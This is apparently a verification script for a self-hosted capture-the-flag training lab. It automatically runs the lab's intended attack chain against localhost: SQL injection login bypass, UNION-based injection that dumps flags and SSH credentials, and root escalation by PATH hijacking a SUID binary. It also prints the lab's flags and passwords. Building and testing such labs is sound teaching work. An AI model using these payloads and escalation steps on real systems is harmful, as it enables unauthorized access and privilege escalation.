#!/bin/bash
set -e

# ======================================================================
# CYBERLAB AUTOMATED END-TO-END VERIFICATION SUITE
# Tests the complete attack chain and operational requirements
# ======================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

PASSED_COUNT=0
TOTAL_COUNT=0

log_test() {
    TOTAL_COUNT=$((TOTAL_COUNT + 1))
    echo -e "${CYAN}[TEST $TOTAL_COUNT] $1...${NC}"
}

assert_success() {
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}  [PASS] $1${NC}"
        PASSED_COUNT=$((PASSED_COUNT + 1))
    else
        echo -e "${RED}  [FAIL] $1${NC}"
        exit 1
    fi
}

echo -e "${YELLOW}==========================================================${NC}"
echo -e "${YELLOW}       STARTING CYBERLAB END-TO-END VERIFICATION          ${NC}"
echo -e "${YELLOW}==========================================================${NC}"

# 1. Check Docker Containers Status
log_test "Checking Docker Compose services status"
WEB_STATUS=$(docker compose ps --services --filter "status=running" | grep -w "web" || true)
DB_STATUS=$(docker compose ps --services --filter "status=running" | grep -w "db" || true)
if [ "$WEB_STATUS" == "web" ] && [ "$DB_STATUS" == "db" ]; then
    assert_success "Containers sqli_lab_web and sqli_lab_db are running"
else
    echo -e "${RED}Containers not running properly.${NC}"
    exit 1
fi

# 2. Check Port Bindings
log_test "Checking Web port 8000"
curl -s -I -m 5 http://localhost:8000/login/ >/dev/null
assert_success "Web port 8000 is accepting HTTP requests"

# 3. Ensure DB port 5432 is NOT exposed on host
log_test "Checking DB port 5432 isolation"
if nc -z -w 1 localhost 5432 2>/dev/null; then
    echo -e "${RED}  [FAIL] DB port 5432 is exposed to host!${NC}"
    exit 1
else
    echo -e "${GREEN}  [PASS] DB port 5432 is internal only (not exposed)${NC}"
    PASSED_COUNT=$((PASSED_COUNT + 1))
fi

# 4. Test Web Login Page
log_test "Testing GET /login/ rendering"
LOGIN_PAGE=$(curl -s http://localhost:8000/login/)
if [[ "$LOGIN_PAGE" == *"Portal Administrasi"* ]]; then
    assert_success "Login page renders successfully"
else
    echo -e "${RED}Login page did not render as expected.${NC}"
    exit 1
fi

# 4. Test Stage 1: SQL Injection Login Bypass
log_test "Testing SQL Injection Login Bypass (admin' --)"
COOKIE_JAR="/tmp/cyberlab_cookie_$$.txt"
LOGIN_RESP=$(curl -s -c "$COOKIE_JAR" -X POST http://localhost:8000/login/ \
    -d "username=admin' --" \
    -d "password=anything" \
    -w "%{http_code}")

if [ "$LOGIN_RESP" == "302" ]; then
    assert_success "SQL Injection bypass returns 302 redirect to dashboard"
else
    echo -e "${RED}Failed SQL Injection login. HTTP code: $LOGIN_RESP${NC}"
    rm -f "$COOKIE_JAR"
    exit 1
fi

# 5. Test Stage 1: Dashboard and Web Flag Retrieval
log_test "Testing Dashboard access and Stage 1 Web Flag display"
DASH_PAGE=$(curl -s -b "$COOKIE_JAR" http://localhost:8000/dashboard/)
if [[ "$DASH_PAGE" == *"FLAG{SQLI_LOGIN_BYPASS}"* ]]; then
    assert_success "Dashboard successfully displays FLAG{SQLI_LOGIN_BYPASS}"
else
    echo -e "${RED}Web flag not found in dashboard response.${NC}"
    rm -f "$COOKIE_JAR"
    exit 1
fi

# 6. Test Stage 2: Product Catalog Access
log_test "Testing /products/ catalog access"
PROD_PAGE=$(curl -s -b "$COOKIE_JAR" http://localhost:8000/products/)
if [[ "$PROD_PAGE" == *"Katalog Produk Enterprise"* ]]; then
    assert_success "Products page loaded successfully"
else
    echo -e "${RED}Products page failed to load.${NC}"
    rm -f "$COOKIE_JAR"
    exit 1
fi

# 7. Test Stage 2: Database Enumeration via Category SQL Injection (Flag 2)
log_test "Testing Category UNION SQLi to dump challenge_flags"
FLAG2_URL="http://localhost:8000/products/?category=1%20UNION%20SELECT%201,%20stage,%20flag_value,%200,%201%20FROM%20challenge_flags--"
FLAG2_RESP=$(curl -s -b "$COOKIE_JAR" "$FLAG2_URL")
if [[ "$FLAG2_RESP" == *"FLAG{DATABASE_ENUMERATION}"* ]]; then
    assert_success "Extracted Stage 2 Flag: FLAG{DATABASE_ENUMERATION}"
else
    echo -e "${RED}Database flag not extracted via SQL injection.${NC}"
    rm -f "$COOKIE_JAR"
    exit 1
fi

# 8. Test Stage 2: Credential Dumping via Category SQL Injection
log_test "Testing Category UNION SQLi to dump system_credentials"
CREDS_URL="http://localhost:8000/products/?category=1%20UNION%20SELECT%201,%20username,%20credential_value,%200,%201%20FROM%20system_credentials--"
CREDS_RESP=$(curl -s -b "$COOKIE_JAR" "$CREDS_URL")
if [[ "$CREDS_RESP" == *"student"* ]] && [[ "$CREDS_RESP" == *"student_ctf_p4ssw0rd!"* ]]; then
    assert_success "Extracted SSH credentials: student : student_ctf_p4ssw0rd!"
else
    echo -e "${RED}System credentials not extracted via SQL injection.${NC}"
    rm -f "$COOKIE_JAR"
    exit 1
fi
rm -f "$COOKIE_JAR"

# 9. Test Stage 3: SSH Login and User Shell
log_test "Testing SSH network login as student on port 2223"
SSH_EXEC_TEST=$(python3 -c "
import paramiko
try:
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect('localhost', port=2223, username='student', password='student_ctf_p4ssw0rd!', timeout=5)
    stdin, stdout, stderr = c.exec_command('whoami')
    res = stdout.read().decode().strip()
    c.close()
    print(res)
except Exception as e:
    print('ERROR:', e)
" 2>/dev/null || echo "FAILED")

if [ "$SSH_EXEC_TEST" == "student" ]; then
    assert_success "SSH network login successful as user 'student'"
else
    echo -e "${RED}SSH network login failed. Result: $SSH_EXEC_TEST${NC}"
    exit 1
fi

# 10. Test Stage 3: Reading User Flag
log_test "Testing Stage 3 User Flag read (/home/student/user.flag)"
USER_FLAG=$(docker compose exec -u student web cat /home/student/user.flag)
if [ "$USER_FLAG" == "FLAG{USER_SHELL_ACQUIRED}" ]; then
    assert_success "Stage 3 User Flag verified: $USER_FLAG"
else
    echo -e "${RED}Failed to read user flag: $USER_FLAG${NC}"
    exit 1
fi

# 11. Test Stage 4: Root Flag Protection (Student CANNOT read /root/root.flag)
log_test "Verifying student cannot read /root/root.flag directly"
ROOT_READ_ATTEMPT=$(docker compose exec -u student web cat /root/root.flag 2>&1 || true)
if [[ "$ROOT_READ_ATTEMPT" == *"Permission denied"* ]]; then
    assert_success "Student correctly denied read access to /root/root.flag"
else
    echo -e "${RED}Security flaw: Student was able to read root flag! Output: $ROOT_READ_ATTEMPT${NC}"
    exit 1
fi

# 12. Test Stage 4: SUID Binary Inspection
log_test "Verifying SUID binary /usr/local/bin/syshealth"
SUID_CHECK=$(docker compose exec -u student web ls -l /usr/local/bin/syshealth)
if [[ "$SUID_CHECK" == *"-rwsr-xr-x"* ]]; then
    assert_success "Binary /usr/local/bin/syshealth has SUID bit set (4755)"
else
    echo -e "${RED}SUID binary misconfigured: $SUID_CHECK${NC}"
    exit 1
fi

# 13. Test Stage 4: Privilege Escalation via PATH Hijacking
log_test "Executing PATH hijacking exploit to obtain root flag"
PRIVESC_RESULT=$(docker compose exec -u student web bash -c "
    rm -rf /tmp/healthcheck
    echo '#!/bin/bash' > /tmp/healthcheck
    echo 'cat /root/root.flag > /tmp/root_flag.txt' >> /tmp/healthcheck
    chmod +x /tmp/healthcheck
    export PATH=/tmp:\$PATH
    /usr/local/bin/syshealth >/dev/null 2>&1
    cat /tmp/root_flag.txt
")

if [ "$PRIVESC_RESULT" == "FLAG{ROOT_COMPROMISED}" ]; then
    assert_success "Privilege escalation successful! Root Flag: $PRIVESC_RESULT"
else
    echo -e "${RED}Privilege escalation failed. Output: $PRIVESC_RESULT${NC}"
    exit 1
fi

# 14. Test Administrator Root Shell via Docker
log_test "Testing Administrator root shell via Docker (docker compose exec -u 0 web /bin/bash)"
ADMIN_WHOAMI=$(docker compose exec -u 0 web whoami)
if [ "$ADMIN_WHOAMI" == "root" ]; then
    assert_success "Administrator has direct root shell inside container"
else
    echo -e "${RED}Administrator root access failed: $ADMIN_WHOAMI${NC}"
    exit 1
fi

# 15. Test Lab Reset Functionality
log_test "Testing lab reset utility (./reset.sh)"
./reset.sh >/dev/null 2>&1
# Verify exploit in /tmp was cleaned up
if docker compose exec -u student web test -f /tmp/root_flag.txt; then
    echo -e "${RED}  [FAIL] Reset failed: /tmp/root_flag.txt still exists.${NC}"
    exit 1
else
    echo -e "${GREEN}  [PASS] Reset successfully cleared exploit files and restored state${NC}"
    PASSED_COUNT=$((PASSED_COUNT + 1))
fi

echo -e "${YELLOW}==========================================================${NC}"
echo -e "${GREEN}  ALL $PASSED_COUNT OF $TOTAL_COUNT TESTS PASSED SUCCESSFULLY!${NC}"
echo -e "${YELLOW}==========================================================${NC}"
